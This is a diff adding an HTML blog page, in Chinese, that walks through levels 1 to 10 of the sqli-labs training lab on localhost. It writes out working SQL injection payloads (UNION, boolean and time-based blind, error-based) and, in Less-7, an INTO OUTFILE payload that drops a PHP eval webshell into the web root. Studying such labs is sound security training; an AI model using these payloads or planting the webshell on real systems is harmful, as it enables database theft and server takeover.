@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Hexo
+    </title>
+    <meta name="description" content= 嘿，我是刘训灼～这是我的子站，用于展示写的Hexo主题：Coder。欢迎访问！ >
+    <meta name="keywords" content= Blog,Hexo,Theme,刘训灼,LiuXunzhuo >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            sql-labs（less1-10）
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>打开 <a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-1">http://127.0.0.1/sql/Less-1</a></p>
+<p>需要我们输入id，输入?id=1</p>
+<p>得到正确的结果</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126101822268.png" alt="image-20201126101822268"></p>
+<p>在后面加个 ‘ </p>
+<p>得到了错误</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126101736809.png" alt="image-20201126101736809"></p>
+<p>可以看出提交的 1’ 在经过sql语句的构造后形成 ‘1’‘ LIMIT 0，1</p>
+<p>多了一个 ’ </p>
+<p>尝试 ‘or 1=1 – +</p>
+<p>此时构造的sql语句为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * FROM users  where id&#x3D;&#39;1&#39;or 1&#x3D;1--+&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126102203933.png" alt="image-20201126102203933"></p>
+<p>得到了正确的返回结果</p>
+<p>这里利用order by 对前面的数据进行排序，这里只有三列数据，所以我们只能够用order by 3</p>
+<p>超过3就会报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’order by 4 -- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126102336117.png" alt="image-20201126102336117"></p>
+<h3 id="分析造成注入的原因"><a href="#分析造成注入的原因" class="headerlink" title="分析造成注入的原因"></a>分析造成注入的原因</h3><p>Sql 语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>Id 参数在拼接 sql 语句时，未对 id 进行任何的过滤等操作</p>
+<p>当提交 ‘or 1=1–+，直接构造的 sql 语句就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’1’or 1&#x3D;1--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>语句中 因为or 1=1  所以永真</p>
+<h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 -- +</span><br></pre></td></tr></table></figure>
+
+<p>当 id 的数据在数据库中不存在时，（此时我们可以 id=-1，两个 sql 语句进行联合操作时，<br>当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返回了我们构造的 union 的数据。<img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126103141054.png" alt="image-20201126103141054"></p>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>像less-1一样，输入?id=1’</p>
+<p>得到错误</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126103411663.png" alt="image-20201126103411663"></p>
+<p>执行的查询语句为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’1’or 1&#x3D;1--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，奇数个的 ‘ 破坏了查询，导致了错误</p>
+<p>因此可以得出结果，查询代码使用了整数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from TABLE where id &#x3D; (some integer value)</span><br></pre></td></tr></table></figure>
+
+<p>可以使用下列代码进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or 1&#x3D;1 -- +</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>依旧使用?id=1’</p>
+<p>得到错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126103421414.png" alt="image-20201126103421414"></p>
+<p>这意味着开发者使用的查询是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select login_name, select password from table where id&#x3D; (‘our input here’)</span><br></pre></td></tr></table></figure>
+
+<p>可以使用下面的代码进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">′)or 1&#x3D;1 -- +</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>依旧使用?id=1’</p>
+<p>发现居然没有得到错误~</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126103433114.png" alt="image-20201126103433114"></p>
+<p>原来这里对与id参数进行了””(双引)和()的包装</p>
+<p>那么使用?id=1” 就可以得到错误了</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126103445958.png" alt="image-20201126103445958"></p>
+<p>可以使用下面的代码注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;) -- +</span><br><span class="line">?id&#x3D;1&quot;) or 1&#x3D;1 -- +</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>在输入?id=1 时发现得到正确的返回结果只有 ：You are in ……… ，不会返回数据库中的信息，所以不能使用上面less1-4中的方法了</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126103511754.png" alt="image-20201126103511754"></p>
+<p>从这一关就要开始学习盲注了</p>
+<h3 id="1-利用left（dabase-1-进行尝试"><a href="#1-利用left（dabase-1-进行尝试" class="headerlink" title="(1)利用left（dabase(),1)进行尝试"></a>(1)利用left（dabase(),1)进行尝试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;and left(version(),1)&#x3D;8-- +</span><br></pre></td></tr></table></figure>
+
+<p>查看version(),这里的意思是看版本号的第一位是不是8，这里返回了正确的结果</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126105241824.png" alt="image-20201126105241824"></p>
+<p>当错误的时候，就不显示 You are in………</p>
+<p>下面看一下数据库的长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;and length(database())&#x3D;8-- +</span><br></pre></td></tr></table></figure>
+
+
+
+<p>猜数据库的第一位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left(database(),1)&gt;&#39;a&#39;-- +</span><br></pre></td></tr></table></figure>
+
+<p>Database()为 security，所以我们看他的第一位是否 &gt; a,很明显的是 s &gt; a,因此返回正确</p>
+<p>猜测数据库第二位<br>得知第一位为 s，我们看前两位是否大于 sa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;and left(database(),2)&gt;&#39;sa&#39;-- +</span><br></pre></td></tr></table></figure>
+
+<h3 id="2）利用-substr-ascii-函数进行尝试"><a href="#2）利用-substr-ascii-函数进行尝试" class="headerlink" title="(2）利用 substr() ascii()函数进行尝试"></a>(2）利用 substr() ascii()函数进行尝试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;80-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126111315962.png" alt="image-20201126111315962"></p>
+<p>使用二分法进行测试，直到测试正确为止。</p>
+<p>获得第一个表的第二个字符，使用substr(**,2,=1)</p>
+<p>获取第二个表，上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那<br>要获取第二个就是 limit 1,1</p>
+<h3 id="（3）利用-regexp-获取（2）中-users-表中的列"><a href="#（3）利用-regexp-获取（2）中-users-表中的列" class="headerlink" title="（3）利用 regexp 获取（2）中 users 表中的列"></a>（3）利用 regexp 获取（2）中 users 表中的列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126112502699.png" alt="image-20201126112502699"></p>
+<p>上述语句时选择 users 表中的列名是否有 us**的列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;and 1&#x3D;(select 1 from information_schema.columns where table_name&#x3D;&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1)-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126112702191.png" alt="image-20201126112702191"></p>
+<p>可以看到 username 存在。我们可以将 username 换成 password 等其他的项也是正确<br>的。</p>
+<h3 id="（4）利用-ord（）和-mid（）函数获取-users-表的内容"><a href="#（4）利用-ord（）和-mid（）函数获取-users-表的内容" class="headerlink" title="（4）利用 ord（）和 mid（）函数获取 users 表的内容"></a>（4）利用 ord（）和 mid（）函数获取 users 表的内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;and ORD(MID((select IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&#x3D;68-- +</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获取 users 表中的内容。获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较，<br>即为 D。而我们从表中得知第一行的数据为 Dumb。</p>
+<h2 id="（5）报错注入"><a href="#（5）报错注入" class="headerlink" title="（5）报错注入"></a>（5）报错注入</h2><h4 id="利用-double-数值类型超出范围进行报错注入"><a href="#利用-double-数值类型超出范围进行报错注入" class="headerlink" title="利用 double 数值类型超出范围进行报错注入"></a>利用 double 数值类型超出范围进行报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select (exp(~(select * FROM(SELECT USER())a))),2,3-- +</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126122128133.png" alt="image-20201126122128133"></p>
+<h4 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a>利用 bigint 溢出进行报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39; union select (!(select * from (select user())x) - ~0),2,3-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126122339097.png" alt="image-20201126122339097"></p>
+<h4 id="xpath-函数报错注入"><a href="#xpath-函数报错注入" class="headerlink" title="xpath 函数报错注入"></a>xpath 函数报错注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126122553489.png" alt="image-20201126122553489"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) -- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126123127681.png" alt="image-20201126123127681"></p>
+<h4 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性"></a>利用数据的重复性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x -- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126123253381.png" alt="image-20201126123253381"></p>
+<h3 id="（6）延时注入"><a href="#（6）延时注入" class="headerlink" title="（6）延时注入"></a>（6）延时注入</h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>利用 sleep()函数进行注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126123449697.png" alt="image-20201126123449697"></p>
+<p>当错误的时候会有 5 秒的时间延时。</p>
+<h4 id="利用-BENCHMARK-进行延时注入"><a href="#利用-BENCHMARK-进行延时注入" class="headerlink" title="利用 BENCHMARK()进行延时注入"></a>利用 BENCHMARK()进行延时注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-5&#x2F;?id&#x3D;1&#39;UNION SELECT (IF(SUBSTRING(current,1,1)&#x3D;CHAR(115),BEN</span><br><span class="line">CHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as cur</span><br><span class="line">rent) as tb1-- +</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当结果正确的时候，运行 ENCODE(‘MSG’,’by 5 seconds’)操作 50000000 次，会占用一段时间</p>
+<p>（but 我出现了一个报错）</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126123829317.png" alt="image-20201126123829317"></p>
+<p>（待解决）</p>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>less-6与less-5的区别是less-6对id参数进行了处理</p>
+<p>所以需要把 ‘ 换成 “</p>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>这关的标题是dump into outfile，也意味着要利用文件导入的方式进行注入</p>
+<p>这里sql对id参数进行了 ‘))的处理</p>
+<p>使用 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’)) or 1&#x3D;1 -- +</span><br></pre></td></tr></table></figure>
+
+<p> 进行注入</p>
+<p>这里使用文件导入的方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,3 into outfile &quot;d:\\phpstudy_pro\\WWW\\sql\\Less-7\\uuu.txt&quot;-- +b</span><br></pre></td></tr></table></figure>
+
+<p>显示报错</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126135658349.png" alt="image-20201126135658349"></p>
+<p>但是文件夹中未出现所创建的文件</p>
+<h4 id="猜测可能是权限问题："><a href="#猜测可能是权限问题：" class="headerlink" title="猜测可能是权限问题："></a>猜测可能是权限问题：</h4><p>​    使用下列代码测试权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126141830862.png" alt="image-20201126141830862"></p>
+<p>结果是正常返回，看来不是权限的问题</p>
+<h4 id="需要在指定的目录下进行数据的导出"><a href="#需要在指定的目录下进行数据的导出" class="headerlink" title="需要在指定的目录下进行数据的导出"></a>需要在指定的目录下进行数据的导出</h4><p>在mysql命令行中测试</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;D:\\1.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Mysql报错，原因是：Mysql数据库需要在指定的目录下进行数据的导出。<br> <code>secure_file_priv</code>这个参数用来限制数据导入和导出操作的效果，例如执行<code>load data</code>、<code>into outfile</code>语句和<code>load_file()</code>函数,这些操作需要用户具有<code>file</code>权限。</p>
+<p><strong>1</strong>. 如果这个参数为空，这个变量没有效果。<br> <strong>2</strong>. 如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它.<br> <strong>3</strong>. 如果这个参数为<code>null</code>，Mysql服务会禁止导入和导出操作。</p>
+<!--参考：-->
+
+<!--作者：Hyafinthus-->
+<!--链接：https://www.jianshu.com/p/7b9256de20d1-->
+<!--来源：简书-->
+<!--著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。-->
+
+<p>查看 secure_file_priv</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126143715940.png" alt="image-20201126143715940"></p>
+<p>发现secure_file_priv 为NULL</p>
+<p>一番尝试后终于解决：</p>
+<p>找到mysql中的my.ini</p>
+<p>在[mysqld]下面加入</p>
+<p>secure_file_priv=</p>
+<p>重启mysql服务，</p>
+<p>再次使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;</span><br></pre></td></tr></table></figure>
+
+<p>发现NULL中的值变为空</p>
+<p>终于尝试后，在文件夹中找到了创建的uuu.txt</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126150921064.png" alt="image-20201126150921064"></p>
+<p>成功查看！</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126151046306.png" alt="image-20201126151046306"></p>
+<p>现在直接将一句话木马导入进去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-7&#x2F;?id&#x3D;1&#39;))UNION SELECT 1,2,&#39;?php @eval($_post[&quot;mima&quot;]);?&#39; into outfile &quot;d:\\phpstudy_pro\\WWW\\sql\\Less-7\\test.php&quot;-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126152352676.png" alt="image-20201126152352676"></p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126152404703.png" alt="image-20201126152404703"></p>
+<p>导入成功</p>
+<p>这个时候需要使用webshell</p>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>发现 ’or 1=1 – +返回正常</p>
+<p>这里试一试延时注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126205248794.png" alt="image-20201126205248794"></p>
+<p>这里if条件的condition正确，则很快得到了正确的返回结果。</p>
+<p>如果错误，则延迟5秒时间才得到加载完成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;113,1,sleep(5))-- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126205551326.png" alt="image-20201126205551326"></p>
+<p>上图可以看到网页正在加载</p>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>这关的标题为：blind time based snigle quotes</p>
+<p>可以看出需要利用延时注入，且对于id参数的处理是 ‘ </p>
+<p>和less-8基本相同</p>
+<p>猜测第一位是不是s   ( ascii码是115  )</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))-- +</span><br></pre></td></tr></table></figure>
+
+<p>正确就很快得到返回，错误就等待5秒。</p>
+<p>猜测第一位是不是e  （ascii码是101）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-9&#x2F;?id&#x3D;1%27and%20If(ascii(substr(database(),2,1))&#x3D;101,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>对于id参数进行了 “ 处理</p>
+<p>和上一关基本相同</p>
+<h2 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h2><p>这里在Less-[]的index.php中的这一语句下</p>
+<p><img src="C:\Users\ASSSIN\AppData\Roaming\Typora\typora-user-images\image-20201126103500904.png" alt="image-20201126103500904"></p>
+<p>加入下列代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">echo $sql;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>使得语句回显，帮助学习</p>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>版权所有 © 2020 | 作者: ASSIN | 主题 By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="NOsswOncKgc8HOxqo9oxIWlX-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="z1FihjWEbS8uIfUQdmCtK7zz">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
